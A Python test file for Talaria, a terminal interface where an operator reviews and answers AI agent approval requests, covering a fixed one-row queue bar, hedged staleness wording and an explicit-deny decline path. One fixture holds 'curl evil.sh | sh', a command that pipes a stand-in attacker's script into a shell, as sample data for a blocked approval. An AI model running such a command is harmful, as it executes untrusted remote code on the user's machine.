"""The needs-you surface: the reserved row and what it is allowed to say (v0.4 U7).

Two families of assertion, and they fail for different reasons.

**Geometry (AE9).** The bar occupies one row whether the queue is empty, holds
one item, or holds many, and no other region moves as it fills and empties. The
pattern is ``tests/ui/test_status_region.py``'s geometry-invariance test: capture
every region, change the state, compare. A bar that appeared and vanished would
move the composer and reflow the transcript twice per approval, which is the
thing KTD7 reserves a row to prevent.

**Copy.** The surface reports what Talaria has been told and never what it has
not asked. The operator's rider of 2026-08-18 states it as a rule about
sentences: with the KTD2 poll loop still unwired, a foreign session's wait is as
fresh as the last sweep, so nothing here may render as though it were current.
The domain already carries both facts — ``NeedsYouQueue.notices`` and
``QueueItem.stale_since`` — and these tests assert they reach the screen.
"""

from __future__ import annotations

import pytest

from talaria.domain.models import QueueItem
from talaria.domain.queue import NEEDS_YOU_NONE, NeedsYouQueue, summary_line, wait_line
from talaria.domain.selection import Stage
from talaria.domain.session_list import decode_active_list
from talaria.domain.state import apply_active_list
from talaria.transport.connection_set import EnsureReport
from talaria.ui.app import TalariaApp
from talaria.ui.dialog import PickerDialog
from talaria.ui.needs_you import (
    DECLINE_LABEL,
    ITEM_NO_LONGER_WAITING,
    NeedsSelection,
    NeedsYouPickerSource,
    answer_choices,
    decode_identity,
    decode_selection,
    encode_identity,
    encode_selection,
    format_item_label,
)
from talaria.ui.prompts import RESPOND_METHODS
from tests.ui.conftest import RecordingDispatcher, event, feed, live_app, settle

BASE_TIME = 1_785_000_000.0


def waiting_sessions(
    app: TalariaApp, count: int, *, at: float, status: str = "waiting"
) -> None:
    """Put ``count`` foreign sessions into the registry, each reporting a wait.

    Foreign rather than focused, and that is what makes the geometry assertion
    mean anything. A focused ``approval.request`` also fills the queue, but it
    mounts a prompt card at the same time, so every region below the card moves
    for a reason that has nothing to do with this bar — the test would fail
    against a correct implementation and pass against one that hid when empty.
    A background connection's wait reaches the queue and mounts nothing, which
    isolates the property AE9 is about.
    """
    app.fleet = apply_active_list(
        app.fleet,
        decode_active_list(
            {
                "sessions": [
                    {
                        "id": f"bg-{index}",
                        "status": status,
                        "title": f"background work {index}",
                    }
                    for index in range(count)
                ]
            }
        ),
        profile=app.fleet_profile,
        at=at,
        poll_epoch=count + 1,
    )
    app._dirty = True


#  ── AE9: one row, from empty to many and back ────────────────────────────


@pytest.mark.asyncio
async def test_the_needs_you_bar_holds_one_row_from_empty_to_many_and_back() -> None:
    """AE9 verbatim: empty → one → many → empty, and nothing else moves.

    The comparison is over every region rather than over the bar's own height,
    because a bar that grew would be visible only as *other* things shifting —
    the composer sliding up, the transcript losing a line and reflowing the text
    the operator was reading. Capturing the whole set is what makes the failure
    legible when it happens.
    """
    app = live_app(RecordingDispatcher())

    async with app.run_test(size=(100, 30)) as pilot:

        def regions() -> dict[str, object]:
            return {
                "needs-you": app.needs_you_bar.region,
                "help": app.help_bar.region,
                "composer": app.composer.region,
                "body": app.query_one("#body").region,
                "transcript": app.transcript.region,
                "prompts": app.prompts.region,
            }

        await settle(app, pilot)
        empty = regions()
        assert app.needs_you.is_empty
        assert app.needs_you_bar.region.height == 1

        waiting_sessions(app, 1, at=BASE_TIME + 10)
        await settle(app, pilot)
        assert app.needs_you.count == 1
        assert regions() == empty, "one waiting item moved a region"

        waiting_sessions(app, 6, at=BASE_TIME + 20)
        await settle(app, pilot)
        assert app.needs_you.count == 6
        assert regions() == empty, "a filling queue moved a region"
        assert app.needs_you_bar.region.height == 1, "the bar grew a second row"

        # And back to empty — by the sessions ceasing to report a wait, which is
        # how a queue actually empties. Dropping the rows instead would have
        # fought KTD2's dual-listing retirement rule (a row absent from one sweep
        # is not retired) and tested the wrong thing: this leg is about the bar
        # surviving the transition, not about row lifetime.
        #
        # It is the half of AE9 a "hide when empty" implementation passes on the
        # way up and fails on the way down.
        waiting_sessions(app, 6, at=BASE_TIME + 30, status="idle")
        await settle(app, pilot)
        assert app.needs_you.is_empty, "the sweep did not retire the waiting rows"
        assert regions() == empty, "an emptying queue moved a region"
        assert app.needs_you_bar.region.height == 1


@pytest.mark.asyncio
async def test_the_row_is_reserved_by_the_stylesheet_not_by_the_summary_never_being_empty() -> None:
    """``height: 1`` is load-bearing, and the region comparison above cannot see it.

    Replacing it with ``height: auto`` leaves the AE9 test above green, because
    every summary that test produces is one line and one line is one row either
    way. **Measured rather than reasoned about**, since the first draft of this
    probe guessed the wrong state: with the widget driven directly through the
    three states below, ``height: 1`` reports 1/1/1 and ``height: auto`` reports
    1/1/**3**. Empty content does not distinguish them — Textual floors a
    ``Static`` at one line — and multi-line content does.

    So the property is not "the summary is never blank"; it is **no content can
    make this row grow**, which is what AE9's "no widget's height moves" needs
    and what a declaration on this widget guarantees without depending on any
    other module's return value.
    """
    app = live_app(RecordingDispatcher())

    async with app.run_test(size=(100, 30)) as pilot:
        await settle(app, pilot)
        bar = app.needs_you_bar

        bar.update("")
        await pilot.pause()
        assert bar.region.height == 1, "the reserved row collapsed when emptied"

        # The state that actually separates the two declarations.
        bar.update("a summary\nthat somehow\narrived as three lines")
        await pilot.pause()
        assert bar.region.height == 1, (
            "the row grew to fit its content — a longer summary would now push "
            "the composer and the transcript up the screen"
        )
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_the_reserved_row_hedges_at_mount_because_nothing_has_been_asked_yet() -> None:
    """The empty state is a rendered sentence, and at mount it is the hedged one.

    Before any connection has been probed there is no seam board, so the queue
    carries a notice per connection and the row reads "none seen · 1 notice: part
    of the fleet could not be asked" rather than the bare ``needs-you: none``.
    That is the rider of 2026-08-18 working rather than a wording accident: a
    client that has asked nothing yet must not render as a client that asked and
    was told nothing is waiting. The bare sentence is reserved for a fleet every
    member of which answered.
    """
    app = live_app(RecordingDispatcher())

    async with app.run_test() as pilot:
        await pilot.pause()
        line = app.needs_you_bar.line

        assert line.startswith(NEEDS_YOU_NONE)
        assert line != NEEDS_YOU_NONE, (
            "an unprobed fleet rendered as though every connection had answered"
        )
        assert "could not be asked" in line
        await app.shutdown_sources()


#  ── R16: the facts survive an 80-column clip, the title does not ─────────


def test_the_summary_puts_age_and_source_before_the_variable_width_title() -> None:
    """R16: source and age remain visible before the session title at 80 columns.

    Asserted on the string rather than on a screen because that is where the
    property lives — the widget clips with an ellipsis, so whatever the string
    puts last is what a narrow terminal loses. A title long enough to fill a row
    on its own must not be able to push the age off the line.
    """
    item = QueueItem(
        profile="default",
        session_id="s1",
        request_key="ap-1",
        source="driven",
        kind="approval",
        summary="approval requested",
        row_key=("default", "s1"),
        opened_at=BASE_TIME,
        session_title="a session title long enough to fill an eighty column row by itself",
    )
    line = summary_line(NeedsYouQueue(items=(item,)), BASE_TIME + 30)

    head = line[:80]
    assert "needs-you: 1" in head
    assert "waiting 30s" in head, "the age was pushed past the clip by the title"
    assert "driven" in head, "the source was pushed past the clip by the title"
    assert line.index("waiting 30s") < line.index(item.session_title[:20])


#  ── the rider: never a freshness claim the surface cannot support ────────


def test_a_connection_that_could_not_be_asked_is_named_beside_the_count() -> None:
    """An empty queue with a blind connection never renders as a bare "none".

    This is the one wrong answer this surface can give: "we could not ask" read
    as "you are free". The count of unanswered connections rides in the same row.
    """
    queue = NeedsYouQueue(notices=("beta: capabilities not probed — nothing is known",))
    line = summary_line(queue, BASE_TIME)

    assert line != NEEDS_YOU_NONE
    assert "could not be asked" in line


def test_a_stale_items_age_is_reported_as_of_the_break_not_as_of_now() -> None:
    """A queue item whose connection dropped does not present a frozen age as live.

    The item waited 40 seconds under observation and has been unobserved for 300
    more. Both numbers appear; neither is added to the other and presented as a
    wait, because Talaria did not watch those 300 seconds and the wait may have
    ended in the first of them.
    """
    item = QueueItem(
        profile="beta",
        session_id="s9",
        request_key="ap-9",
        source="approval-poll",
        kind="approval",
        summary="approval requested",
        row_key=("beta", "s9"),
        opened_at=BASE_TIME,
        stale_since=BASE_TIME + 40,
    )
    line = format_item_label(item, BASE_TIME + 340)

    assert "waiting ≥ 40s" in line
    assert "unobserved for 300s" in line
    assert "340s" not in line, "the age kept counting after the stream broke"


#  ── the drill-down source ────────────────────────────────────────────────


def test_the_drill_down_lists_items_then_the_connections_it_could_not_ask() -> None:
    """Notices are rows in the list, not a footnote under it.

    A connection that answers nothing contributes silence to the item list, and
    on this surface silence reads as "no". They come last, after the things that
    can be acted on, and refuse selection because each reports a connection
    rather than offering something to answer.
    """
    item = QueueItem(
        profile="default",
        session_id="s1",
        request_key="ap-1",
        source="driven",
        kind="approval",
        summary="approval requested",
        command="rm -rf build",
        row_key=("default", "s1"),
        opened_at=BASE_TIME,
    )
    queue = NeedsYouQueue(items=(item,), notices=("beta: connection down — its rows are stale",))
    stage = NeedsYouPickerSource(queue, BASE_TIME + 5).root()
    choices = stage.selection.items

    assert len(choices) == 2
    assert choices[0].selectable
    assert "rm -rf build" in choices[0].detail
    assert not choices[1].selectable, "a connection notice was offered as answerable"
    assert choices[1].refusal, "an unselectable row with nothing to say"
    assert "beta" in choices[1].label


def test_a_selection_carries_the_items_identity_rather_than_its_position() -> None:
    """The queue is derived on every render, so a row index is not a name.

    An index taken when the dialog opened may name a different item by the time
    it closes — the queue reorders by age and drops what resolves. The payload is
    the identity triple, which either still names an item or names nothing.
    """
    item = QueueItem(
        profile="default",
        session_id="s1",
        request_key="ap-1",
        source="driven",
        kind="approval",
        summary="approval requested",
        row_key=("default", "s1"),
        opened_at=BASE_TIME,
    )
    stage = NeedsYouPickerSource(NeedsYouQueue(items=(item,)), BASE_TIME).root()
    payload = stage.selection.items[0].payload
    selection = decode_selection(payload)

    assert selection is not None
    assert selection.identity == item.identity
    assert selection.action == "go", "a row with no inline answer is a navigation"
    assert NeedsYouQueue(items=(item,)).item_for(item.identity) is item


def test_an_unparseable_payload_names_nothing_rather_than_guessing() -> None:
    """A mangled identity resolves to ``None``, never to a partial match.

    The one input that produces this is a gateway-supplied id containing the
    separator. Splitting on the first two and hoping would aim an approval at
    whatever row the remainder happened to match, which is the misroute this
    whole release keeps closing off.
    """
    assert decode_identity("not-an-identity") is None
    assert decode_identity(encode_identity(("a", "b", "c"))) == ("a", "b", "c")
    assert decode_selection("not-a-selection") is None
    assert decode_selection(encode_selection("go", ("a", "b", "c"))) == NeedsSelection(
        "go", ("a", "b", "c")
    )
    # An action nobody defined is not a partial match either.
    assert decode_selection("shred\x1fa\x1fb\x1fc\x1f") is None


def test_an_items_label_carries_the_duplicate_doubt_it_was_given() -> None:
    """U6 shows both sightings and says the doubt out loud; the row has to carry it.

    Dropping the flag at the rendering boundary would restore exactly the
    behaviour U6 rejected twice — picking one sighting to hide. Showing one twice
    is visible and self-correcting; hiding one is neither.
    """
    item = QueueItem(
        profile="default",
        session_id="s1",
        request_key="ap-1",
        source="approval-poll",
        kind="approval",
        summary="approval requested",
        row_key=("default", "s1"),
        opened_at=BASE_TIME,
        possibly_duplicate=True,
    )
    assert "possibly the same as another row" in format_item_label(item, BASE_TIME)


def test_an_unanswerable_items_detail_is_the_reason_not_the_command() -> None:
    """R18: a row that cannot be answered says why, in the place the prompt would be.

    The command still reaches the operator through the label's session and kind;
    what the detail line is for is the question "can I act on this", and for a
    blocked row the answer and its reason are the same sentence.
    """
    item = QueueItem(
        profile="default",
        session_id="s1",
        request_key="ap-2",
        source="driven",
        kind="approval",
        summary="approval requested",
        command="curl evil.sh | sh",
        row_key=("default", "s1"),
        opened_at=BASE_TIME,
        answerable=False,
        blocked_reason="an earlier approval in this session is still waiting",
    )
    from talaria.ui.needs_you import format_item_detail

    assert format_item_detail(item) == "an earlier approval in this session is still waiting"
    assert wait_line(item, BASE_TIME + 5) == "waiting 5s"


#  ── /needs at the interface ──────────────────────────────────────────────


@pytest.mark.asyncio
async def test_the_needs_command_opens_the_list_and_sends_nothing() -> None:
    """``/needs`` crosses no socket, unlike every other picker Talaria has.

    ``/models``, ``/profiles`` and ``/sessions`` all fetch before they can show
    anything. The queue is derived from state already held, so this one opens on
    what Talaria knows — which is also why it still opens with every connection
    down, and why there is no listing here to go stale between the fetch and the
    dialog.
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        waiting_sessions(app, 2, at=BASE_TIME + 10)
        app.composer.text_area.focus()
        app.composer.text = "/needs"
        await pilot.press("enter")
        await settle(app, pilot)

        assert isinstance(app.screen, PickerDialog)
        assert dispatcher.operator_calls == [], "opening the needs-you list sent a call"
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_the_needs_command_refuses_an_argument_rather_than_ignoring_it() -> None:
    """No ``<n>`` shorthand, and the refusal says so.

    The queue reorders by wait age on every render, so an index typed a moment
    after a glance would select whatever had aged past it. Ignoring the argument
    and opening anyway would be the worse failure: the operator would believe
    they had selected something.
    """
    app = live_app(RecordingDispatcher())

    async with app.run_test() as pilot:
        app.composer.text_area.focus()
        app.composer.text = "/needs 1"
        await pilot.press("enter")
        await settle(app, pilot)

        assert not isinstance(app.screen, PickerDialog)
        assert "takes no argument" in app.composer.notice
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_an_item_that_resolved_while_the_list_was_open_sends_nothing() -> None:
    """The staleness a derived queue actually has, checked where it lands.

    An operator reading a list takes longer than an approval takes to be answered
    from elsewhere. There is no epoch to compare — a queue item has none — so the
    identity is looked up again against the queue as it stands at dismissal, and
    an identity that names nothing is reported rather than acted on.
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        waiting_sessions(app, 1, at=BASE_TIME + 10)
        await settle(app, pilot)
        item = app.needs_you.items[0]

        # The wait ends while the list is open: the session stops reporting it.
        waiting_sessions(app, 1, at=BASE_TIME + 20, status="idle")
        await settle(app, pilot)
        assert app.needs_you.is_empty

        app._needs_dismissed()(encode_selection("go", item.identity))
        await settle(app, pilot)

        assert dispatcher.operator_calls == [], "a resolved item was acted on anyway"
        assert app.composer.notice == ITEM_NO_LONGER_WAITING
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_choosing_an_item_on_another_connection_ensures_that_profile_first() -> None:
    """A session id names a session only on the gateway that issued it.

    Resuming a background connection's id against the home one asks the wrong
    gateway about a session it has never heard of — and it would answer, because
    "no such session" is a perfectly ordinary reply, so the operator would see a
    refusal about their own item. The profile is ensured first (KTD1: brought up
    beside the others and made home, nothing dropped) and only then is the
    session resumed.
    """

    class RecordingEnsurer:
        def __init__(self) -> None:
            self.ensured: list[str] = []
            self.home = ""

        async def ensure(self, profile: str) -> EnsureReport:
            self.ensured.append(profile)
            self.home = profile
            return EnsureReport(profile, "connected", "connected")

    ensurer = RecordingEnsurer()
    app = live_app(RecordingDispatcher(), connections=ensurer)

    async with app.run_test() as pilot:
        await settle(app, pilot)
        item = QueueItem(
            profile="beta-fixture",
            session_id="bg-7",
            request_key="ap-7",
            source="approval-poll",
            kind="approval",
            summary="approval requested",
            row_key=("beta-fixture", "bg-7"),
            opened_at=BASE_TIME,
        )
        assert item.profile != app.fleet_profile

        await app._go_to_item(item)
        await settle(app, pilot)

        assert ensurer.ensured == ["beta-fixture"], (
            "the item's own connection was never brought up, so the resume went "
            "to whichever gateway happened to be home"
        )
        await app.shutdown_sources()


#  ── inline answers: explicit, keyboard-only, never an empty choice ───────


def approval_item(**overrides: object) -> QueueItem:
    fields: dict[str, object] = {
        "profile": "default",
        "session_id": "s1",
        "request_key": "ap-1",
        "source": "driven",
        "kind": "approval",
        "summary": "approval requested",
        "command": "rm -rf build",
        "row_key": ("default", "s1"),
        "opened_at": BASE_TIME,
        "choices": ("once", "always", "deny"),
        "observed_request_id": "ap-1",
    }
    fields.update(overrides)
    return QueueItem(**fields)  # type: ignore[arg-type]


def test_the_decline_row_sends_an_explicit_deny_and_never_an_empty_choice() -> None:
    """The one assertion this whole path exists for.

    The gateway's approval consumer blocks only on ``None`` and ``"deny"`` and
    returns *approved* for anything else it resolves. So an empty approval choice
    is an approval, and a decline that sent one would grant the command it looked
    like it refused. Every row here carries a value somebody named.
    """
    rows = answer_choices(approval_item())
    values = [decode_selection(row.payload) for row in rows]

    assert all(selection is not None for selection in values)
    assert all(selection.value for selection in values if selection is not None), (
        "an answer row carries an empty value — for an approval that is a yes"
    )
    decline = next(row for row in rows if row.label == DECLINE_LABEL)
    chosen = decode_selection(decline.payload)
    assert chosen is not None
    assert chosen.action == "decline"
    assert chosen.value == "deny"

    # The gateway's own ``deny`` is not offered twice: it is the decline row.
    assert [row.label for row in rows].count("deny") == 0


def test_an_approval_the_gateway_listed_no_choices_for_still_offers_a_named_answer() -> None:
    """An unlisted approval falls back to the card's own fallback, not to nothing.

    Both paths read ``NO_CHOICES_FALLBACK``, so the list and the card cannot
    disagree about what an approval with no stated choices offers.
    """
    rows = answer_choices(approval_item(choices=()))
    assert rows, "an approval with no listed choices offered nothing at all"
    assert all(decode_selection(row.payload).value for row in rows)  # type: ignore[union-attr]


@pytest.mark.asyncio
async def test_answering_inline_goes_through_the_card_paths_own_function() -> None:
    """KTD9: the queue path and the card path converge on ``respond_live``.

    Asserted by comparing the two paths' actual wire calls for the *same* prompt,
    rather than by checking that some method was called. Convergence is the
    claim, so the evidence has to be that the two are indistinguishable at the
    socket — and it is, because both go through ``respond_live`` and neither
    builds its own parameters.

    The transcript verb is where they differ, and only there: an answer is
    "answered" and a decline is "declined", which is the one thing ``declined``
    changes.
    """

    async def answered_call(inline: bool) -> tuple[str, dict[str, object]]:
        dispatcher = RecordingDispatcher()
        app = live_app(dispatcher)
        async with app.run_test() as pilot:
            feed(
                app,
                event(
                    "approval.request",
                    {"description": "rm -rf build", "choices": ["once", "deny"]},
                ),
            )
            await settle(app, pilot)
            item = app.needs_you.items[0]
            assert item.identity in app._inline_answerable(app.needs_you)

            if inline:
                app._needs_dismissed()(encode_selection("answer", item.identity, "once"))
            else:
                await app.respond_live(item.request_key, "once", expected_kind="approval")
            await settle(app, pilot)

            calls = [
                call
                for call in dispatcher.operator_calls
                if call[0] == RESPOND_METHODS["approval"]
            ]
            assert calls, "no answer reached the wire"
            await app.shutdown_sources()
            return calls[0][0], dict(calls[0][1])

    assert await answered_call(inline=True) == await answered_call(inline=False), (
        "the queue path and the card path sent different things for one prompt"
    )


@pytest.mark.asyncio
async def test_a_row_whose_prompt_left_the_registry_is_not_offered_inline() -> None:
    """The second gate: answerable in principle is not answerable in fact.

    The queue decides an item is the session's head approval with a request id.
    Only the focused engine's registry knows whether ``respond_live`` would still
    accept it — and offering a row that function would refuse is an inert
    control, which is the failure AE11 exists to prevent. Here the item is
    fabricated with everything the queue checks and nothing the registry does.
    """
    app = live_app(RecordingDispatcher())

    async with app.run_test() as pilot:
        await settle(app, pilot)
        item = approval_item(session_id="never-seen", request_key="ap-ghost")
        queue = NeedsYouQueue(items=(item,))

        assert item.answerable
        assert item.observed_request_id
        assert app._inline_answerable(queue) == frozenset(), (
            "a row with no live prompt behind it was offered an inline answer"
        )

        # And the dialog therefore treats enter as navigation rather than descent.
        stage = NeedsYouPickerSource(queue, BASE_TIME).root()
        outcome = NeedsYouPickerSource(queue, BASE_TIME).descend(0, stage.selection.items[0])
        assert isinstance(outcome, str)
        await app.shutdown_sources()


def test_an_answerable_row_descends_to_its_choices_rather_than_emitting() -> None:
    """Enter on an answerable approval opens the named choices, keyboard-only.

    No new key: ``PickerDialog`` gives every printable key to the filter, which
    is the behaviour the plan also asks for ("typing filters"), so an ``a``/``d``
    pair would take two letters back out of it. The descent is the mechanism the
    dialog already has, and it is what ``/models`` does between a provider and
    its models.
    """
    item = approval_item()
    queue = NeedsYouQueue(items=(item,))
    source = NeedsYouPickerSource(
        queue, BASE_TIME + 12, inline_answerable=frozenset({item.identity})
    )
    root = source.root()
    outcome = source.descend(0, root.selection.items[0])

    assert isinstance(outcome, Stage), "an answerable approval emitted instead of descending"
    assert "waiting 12s" in outcome.title, (
        "the answer stage restated the age instead of carrying the list's own sentence"
    )
    assert [row.label for row in outcome.selection.items] == ["once", "always", DECLINE_LABEL]


def test_the_answer_stage_reports_a_stale_wait_with_the_same_floor_the_list_used() -> None:
    """The freshness standard applies to the answer path too.

    The title is built from ``wait_line``, so an item whose connection dropped
    carries its floor and its blind span into the moment of answering rather than
    being restated as a live age at the point it matters most.
    """
    item = approval_item(stale_since=BASE_TIME + 40)
    source = NeedsYouPickerSource(
        NeedsYouQueue(items=(item,)),
        BASE_TIME + 340,
        inline_answerable=frozenset({item.identity}),
    )
    outcome = source.descend(0, source.root().selection.items[0])

    assert isinstance(outcome, Stage)
    assert "waiting ≥ 40s" in outcome.title
    assert "unobserved for 300s" in outcome.title
    assert "340s" not in outcome.title


@pytest.mark.asyncio
async def test_an_inline_decline_is_recorded_as_a_decline_and_not_as_an_answer() -> None:
    """``declined`` is carried through, and the record is the only place it shows.

    Found by mutation: replacing ``declined=selection.action == "decline"`` with
    a constant ``False`` left the whole suite green, because every other
    assertion here is about what reaches the wire — and a decline sends the same
    ``approval.respond`` an answer does, with ``deny`` as its choice. The
    difference is the verb written into the transcript, and "approval answered"
    for a command the operator refused is a false entry in the one record that
    says what was allowed.
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(
            app,
            event("approval.request", {"description": "rm -rf build", "choices": ["once", "deny"]}),
        )
        await settle(app, pilot)
        item = app.needs_you.items[0]

        app._needs_dismissed()(encode_selection("decline", item.identity, "deny"))
        await settle(app, pilot)

        notice = app.composer.notice
        assert "declined" in notice, (
            f"an inline decline was recorded as something else: {notice!r}"
        )
        assert "answered" not in notice, "a refusal was written down as an answer"

        # It is still the ordinary answer path underneath: same method, and the
        # explicit deny rather than an empty choice.
        sent = [
            call for call in dispatcher.operator_calls if call[0] == RESPOND_METHODS["approval"]
        ]
        assert sent and sent[0][1].get("choice") == "deny"
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_escape_leaves_the_list_having_sent_nothing_and_returns_the_caret() -> None:
    """Backing out is a first-class outcome, not an absence of one.

    The dialog dismisses with ``None`` and the handler's first act is to put the
    caret back in the composer — before the early return, so the operator gets
    the caret back whether they chose something or changed their mind. A modal
    that keeps the focus after closing is the shape that makes the next
    keystroke go nowhere.
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(
            app,
            event("approval.request", {"description": "rm -rf build", "choices": ["once", "deny"]}),
        )
        await settle(app, pilot)

        app.composer.text_area.focus()
        app.composer.text = "/needs"
        await pilot.press("enter")
        await settle(app, pilot)
        assert isinstance(app.screen, PickerDialog)

        await pilot.press("escape")
        await settle(app, pilot)

        assert not isinstance(app.screen, PickerDialog), "escape left the dialog up"
        assert app.composer.text_area.has_focus, "the caret never came back to the composer"
        assert [
            call for call in dispatcher.operator_calls if call[0] == RESPOND_METHODS["approval"]
        ] == [], "backing out of the list answered something"
        # The approval is untouched: still waiting, still answerable.
        assert app.needs_you.count == 1
        await app.shutdown_sources()
